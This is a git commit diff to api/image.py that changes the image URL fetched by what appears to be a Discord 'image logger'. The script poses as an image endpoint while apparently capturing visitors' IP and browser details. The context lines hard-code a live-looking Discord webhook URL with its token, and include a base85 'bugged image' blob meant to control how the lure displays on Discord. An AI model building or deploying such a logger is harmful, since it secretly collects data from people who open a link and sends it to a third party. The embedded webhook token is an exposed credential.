77b13c04636601a528a5a81c0e1347036db83f4c
tonnysjonny <tonnysjonny@gmail.com>
2026-08-31 13:59:37 +0200

    Update image URL in image.py

--- api/image.py
+++ api/image.py
@@ -4,7 +4,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1543915184202981446/1L0Ny1ZlFsiFsWMnoKx2StWGY7y1MPoTkohqZswLz-jV1yofM5NP01Na-adiOZDdE9fI'
 
-bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
+bindata = httpx.get('https://www.humanium.org/en/wp-content/uploads/2020/04/shutterstock_84115585-1-1024x768.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
